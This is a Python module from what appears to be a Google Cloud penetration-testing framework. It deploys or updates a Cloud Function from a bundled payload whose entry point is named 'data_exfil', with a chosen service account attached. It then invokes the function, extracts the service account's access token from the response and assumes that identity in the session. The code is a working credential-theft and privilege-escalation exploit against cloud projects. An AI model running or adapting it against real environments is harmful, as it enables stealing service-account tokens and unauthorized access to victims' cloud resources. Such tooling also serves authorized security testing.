from Modules.CloudFunctions.utils.util_helpers import *

def run_module(user_args, session, first_run = False, last_run = False, callback=False, output_format = ["table"]):

    parser = argparse.ArgumentParser(description="Exploit Invoking Functions to Get Metadata/Execute Code", allow_abbrev=False)
    
    parser.add_argument("--function-name",type=str, required =False, help="Function name to create/update/invoke (format - projects/<project_id>/locations/<region>/functions/<function-name>)")
    
    parser.add_argument("--bucket-src",type=str,required=False,help="Where created/updated function will get source code from, (format - gs://<bucket_name>/<filename>.zip)")
    parser.add_argument("--entry-point",type=str,required=False,help="Entry point of code. Default codev1v2.zip is 'data_exfil', but can set to other value if you want ot manually change/upload your own code")

    parser.add_argument("--service-account",type=str,required=False,help="Service account to attach to function if non-default (ex. <service_account_email>)")

    exclusive_version_group = parser.add_mutually_exclusive_group(required=False)
    exclusive_version_group.add_argument("--v1", action="store_true",  help="Target function is V1 Function")
    exclusive_version_group.add_argument("--v2", action="store_true", help="Target function is V2 Function")

    exclusive_function_action_group = parser.add_mutually_exclusive_group(required=False)
    exclusive_function_action_group.add_argument("--create", action="store_true",  help="Create function with service")
    exclusive_function_action_group.add_argument("--update", action="store_true", help="Update function with service")

    parser.add_argument("--invoke", action="store_true",  help="Call a function")
    parser.add_argument("--assume-creds", action="store_true",  help="Try to assume returned creds from --invoke")
    
    # TODO In Progress
    #parser.add_argument("--cleanup", action="store_true",  help="Call a function and try to assume returned creds")

    parser.add_argument("-v","--debug",action="store_true",required=False,help="Get verbose data returned")

    args = parser.parse_args(user_args)
    
    debug = args.debug

    function_client_v1 = functions_v1.CloudFunctionsServiceClient(credentials=session.credentials)
    function_client_v2 = functions_v2.FunctionServiceClient(credentials=session.credentials)
    
    entry_point = "data_exfil"
    if args.entry_point:
        entry_point = args.entry_point

    if args.assume_creds and not args.invoke:
        print("[X] You need to pass in --invoke if you want to try --assume")
        return -1

    function_name, bucket_gs_source, sa_email = None, None, None
    
    if args.function_name:

        if check_function_format(args.function_name):
            function_name = args.function_name
        else:
            print("[X] Incorrect \"function-name\" format. Ex. projects/[project-id]/locations/[location]/functions/[function-simple-name]")
            return -1

    if args.bucket_src:

        if check_bucket_source_format(args.bucket_src):

            bucket_gs_source = args.bucket_src

        else:
            print("[X] Incorrect \"bucket-source\" format. Ex. gs://[bucket_name]/[folder_path]/[filename] (ex. gs://[bucket_name]/test.zip or gs://[bucket_name]/folder1/test2.zip)")
            return -1

    
    if args.service_account:

        sa_email = args.service_account

    # Default to user-supplied arguments
    version = None
    if args.v1: version = "1"
    elif args.v2: version = "2"

    create, update, only_invoke = False, False, False
    if not args.create and not args.update and not args.invoke:
        
        create_or_update = session.choice_selector(["Create","Update", "Only Invoke"], "Do you want to create/update or invoke a function:")
        if create_or_update == "Create":
            create  = True
        elif create_or_update == "Update":
            update  = True
        elif create_or_update == "Only Invoke":
            create, update, only_invoke  = False, False, True
    
    elif args.create:
        create  = True
    elif args.update:
        update  = True

    # function name not supplied for update/call, prompt for existing one
    if not function_name and not args.create and (update or args.invoke or only_invoke):

        rows_returned = session.get_data("cloudfunctions-functions", ["name", "environment"])
        
        if len(rows_returned) == 0:
            
            if update:
                switch_to_create = session.choice_prompt("Do you want to create a new function (as opposed to updating)? [y/n] ", regex = r"^[yY]|[nN]")
                if create_or_update.lower() == "y":
                    # Switch to create and proceed to if create branch
                    create, update =  True, False

                elif create_or_update.lower() == "n":
                    print("[X] Exiting since there are no functions to update. Consider passing in function name with --function-name if you have it in mind.")
                    return None
            
            else:
                print("[X] No functions were found when running the module. Consider specifying a function in the --function-name flag when running the module again")
                return None

        for function in rows_returned:
            function_name = function["name"]
            function_version = function["environment"]
            function["printout"] = f"(Version {function_version}) {function_name}"

        rows_returned = sorted(rows_returned, key=lambda x: x["printout"])

        function_dict = session.choice_selector(rows_returned,"Choose an existing function from below to update and/or invoke:", fields=["printout"])
        
        function_name = function_dict["name"]

        function_environment = function_dict["environment"]
        
        if not version:
            version = "2" if function_environment == "2" else "1"        

    # If function name not provided for create promtp for user input
    if not function_name and create:

        function_name = session.choice_prompt("Provide the function name to create in the format projects/[project_id]/locations/[location_id]/functions/[function_name]? ", regex = r'^projects/[^/]+/locations/[^/]+/functions/[^/]+$')
        # If no version has been passed in ask user for it
        if not version:
            version = session.choice_selector(["V1","V2"], "Choose version of function (modern day GCP defaults to V2):")
            if version == "V1": version = "1"
            elif version == "V2": version = "2"

    # If bucket not supplied for create/update prompt user for buckets already enumerated
    if not bucket_gs_source and (create or update):

        upload_to_bucket = session.choice_prompt("No bucket has been provided. Do you want to upload source code to a bucket now? [y/n]", regex = r"^[yY]|[nN]")
        
        if upload_to_bucket.lower() == "n":
            print("[X] Rerun the module with the --bucket-src argument (gs://bucket_name/zip_to_upload.zip) once you have uploaded the file.")
            print("[X] If running something OTHER than the codev1v2.zip file provided, make sure to pass in --entry-point as well if different than \"data_exfil\"")
            return -1

        elif upload_to_bucket.lower() == "y":
            
            use_default_payload = session.choice_prompt("Do you want to upload the default ZIP file stored by the tool (codev1v2.zip) to an existing bucket enumerated this account? [y/n] ", regex = r"^[yY]|[nN]")
            
            arguments = []
            
            if use_default_payload.lower() == "y":
                user_args = ["--local-blob-path", "./Modules/CloudFunctions/utils/codev1v2.zip"]
                module = importlib.import_module("Modules.CloudStorage.Exploit.exploit_bucket_upload")
                print(user_args)
                arguments = module.run_module(user_args, session, callback=True)
                if arguments == -1:
                    print("[X] Overall cloud functions invoke module failed due to failure of bucket upload. Try manually uploading and supplying the gs:// path for the zip file when re-running the module.")
                    return -1
                else:
                    bucket_name, local_blob_path, remote_blob_path = arguments[0], arguments[1], arguments[2]
                    bucket_gs_source = "gs://"+bucket_name+"/"+remote_blob_path
                    print(f"[*] Proceeding with payload at {bucket_gs_source}")

            elif use_default_payload.lower() == "n":
                print("[X] Rerun the module with the --bucket-src argument (gs://bucket_name/zip_to_upload.zip) once you have uploaded the file.")
                return -1
        
    if not sa_email and (create or update):
        sa_role = session.choice_prompt("Do you want to specify a service role to attach on create/update? Note IF CREATING a function, the sdk will auto-attach the default editor sa of PROJECT_ID@appspot.gserviceaccount.com (v1) or PROJECT_NUMBER-compute@developer.gserviceaccount.com (v2) and can reply \"n\" to this question. [y/n] ", regex = r"^[yY]|[nN]")
        if sa_role.lower() == "y":
            rows_returned = session.get_data("iam-principals", columns = ["name", "email"])
            
            if len(rows_returned) ==0:
                print("[X] No service accounts were identified in the existing databases. If you know of the email re-run the module with the --sa-email flag. Exiting...")
                return -1
            
            else:
                sa_dict = session.choice_selector(rows_returned,"Choose an existing sa from those below to attach to the updated/created cloud function:", fields=["email", "name"])
                sa_email = sa_dict["email"]


    # Defer to version 2 if not figured out by this point
    if version == "1":
        client_arg = function_client_v1
    elif version == "2":
        client_arg = function_client_v2
    else:
        version = "2"
        client_arg = function_client_v2

    project_id = function_name.split("/")[1]


    action_dict = {}

    if create:

        # default SA indicates whether we should allow automatic sa attached as is done programatically or explicity tell it to start with no role
        status = create_function(client_arg, function_name, bucket_gs_source, version, entry_point, sa = sa_email, debug=debug)
        if status:
            action_dict.setdefault("project_permissions", {}).setdefault(project_id, set()).add("cloudfunctions.functions.create")
 
    elif update:
        
        status = update_function(client_arg, function_name, bucket_gs_source, version, entry_point,  sa = sa_email, debug=debug)
        if status:
            if version == "1":
                action_dict.setdefault(project_id, {}).setdefault("cloudfunctions.functions.update", {}).setdefault("functions_v1", set()).add(function_name)

            elif version == "2":
                action_dict.setdefault(project_id, {}).setdefault("cloudfunctions.functions.update", {}).setdefault("functions_v2", set()).add(function_name)

    if args.invoke or only_invoke:

        auth_json = None

        # Needed because functions v2 has no SDK so have to manually pass in creds
        if version == "2":
            all_auth = session.get_credinfo(self_credname = True)
            if "session_creds" in all_auth and all_auth["session_creds"]:
                print(all_auth["session_creds"])
                auth_json = json.loads(all_auth["session_creds"])
            
            else:
                print("[X] An error occurred when trying to get the users credentials to call the V2 Function. The function might have been updated but was not invoked. Consider doing this manually from the console.")
                return -1
        
        response = call_function(function_client_v1, function_name, version, auth_json = auth_json, debug=debug)
        
        if response:

            print("[*] Response from function is:")
            print(response)

            if version == "1":
                action_dict.setdefault(project_id, {}).setdefault("cloudfunctions.functions.invoke", {}).setdefault("functions_v1", set()).add(function_name)
            elif version == "2":
                action_dict.setdefault(project_id, {}).setdefault("cloudfunctions.functions.invoke", {}).setdefault("functions_v2", set()).add(function_name)
            
            if args.assume_creds:

                # Remove unnecessary escape characters
                cleaned_string = response.replace('\\\"', '\"').replace('\"{', '{').replace('}\"', '}')
            
                data_dict = json.loads(cleaned_string)

                if 'email' in data_dict.keys():
                    email = data_dict["email"]
                else:
                    email = "Uknown_Email"

                current_datetime = datetime.now()
                timestamp = current_datetime.strftime("%m%d%Y_%H%M_UTC")
                credname = email + "_" + timestamp
                access_token = data_dict["token"]["access_token"]


                # Cleanup here

                # Save actions before assuming new user
                if action_dict:
                    session.insert_actions(action_dict, project_id, column_name = "function_actions_allowed") 

                session.add_oauth2_account(credname, token=access_token, project_id = session.project_id,  email = email, assume = True)

                return 1
        else:
            print(f"[X] Tried calling {function_name} but did not get a response. Exiting module...")

    
        if action_dict:
            session.insert_actions(action_dict, project_id, column_name = "function_actions_allowed") 